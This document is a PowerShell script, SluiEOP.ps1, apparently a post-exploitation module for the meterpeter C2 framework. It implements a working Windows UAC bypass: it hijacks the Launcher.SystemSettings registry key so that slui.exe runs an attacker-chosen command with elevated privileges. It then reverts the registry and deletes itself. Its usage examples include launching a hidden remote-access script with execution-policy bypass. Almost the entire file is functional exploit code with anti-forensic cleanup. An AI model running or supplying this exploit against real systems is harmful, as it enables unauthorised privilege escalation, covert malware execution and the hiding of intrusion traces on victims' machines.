<#
.SYNOPSIS
   SluiEOP can be used to escalate privileges or to execute a command with high integrity (SYSTEM)

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - 18363.778
   EOP Disclosure By: @mattharr0ey
   Required Dependencies: none
   Optional Dependencies: none
   PS Script Dev Version: v1.5

.DESCRIPTION
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas

.NOTES
   SluiEOP.ps1 script was written as meterpeter C2 Post-Exploitation module.
   This script 'reverts' regedit hacks to the previous state before the EOP.

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
   Execute powershell process with high privileges (SYSTEM)

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
   Execute notepad process with high privileges (SYSTEM)

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
   Execute $env:TMP\MyRat.ps1 script with high privileges (SYSTEM) in an hidden console.

.INPUTS
   None. You cannot pipe objects into SluiEOP.ps1

.OUTPUTS
   None. this script does not display any outputs.

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
    https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
#>


$Command = $Null
$param1 = $args[0] # User Inputs [<Arguments>]
If(-not($param1) -or $param1 -eq $null){
   $Command = "$env:WINDIR\System32\cmd.exe"
}else{
   $Command = "$param1"
}

## Check Vulnerability before continue any further ..
$CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
If($CheckVuln -eq $True){

   ## For those who run SluiEOP.ps1 outside meterpeter C2
   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
      Write-Host "SluiEOP v1.5 - By: r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
      Write-Host "[+] Executing Command: '$Command'"
      $DetailedDataDump = $True
   }

   ### Add Entrys to Regedit { using powershell }
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 700

   ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null

   ### Start the vulnerable process { using powershell }
   Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas

   Start-Sleep -Milliseconds 2600
   ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force

   <#
   .SYNOPSIS
      Helper - Get the spawned <ProcessName> and <PID>
      Author: @r00t-3xp10it

   .DESCRIPTION
      Display a More Detailed Information for those who run SluiEOP outside meterpeter C2

   .EXAMPLE
      PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"

      ProccessName PID
      ------------ ---
      notepad      5543
   #>

   If($DetailedDataDump -eq $True){
      If(-not($Command -match ' ') -and $Command -match '\\'){
         $ParsingData = $Command -Split('\\')
         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
         If($ProcessName -match '.exe'){
            $ProcessName = $ProcessName -replace '.exe',''
            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         }else{
            $EOPID = "null"
         }
      }else{
         $ParsingData = $Command -Split(' ')
         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
         If($ProcessName -match '.exe'){
            $ProcessName = $ProcessName -replace '.exe',''
            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         }else{
            $EOPID = "null"
         }
      }

      ## Build PSObject Table Object
      $DumpProcessPID = New-Object -TypeName PSObject
      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
      $DumpProcessPID
   }

}else{
   echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
}

## Clean old files/configurations left behind after EOP finished ..
If(Test-Path "$env:TMP\fail.log"){Get-Content -Path "$env:TMP\fail.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\fail.log" -Force -EA SilentlyContinue}
If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
Exit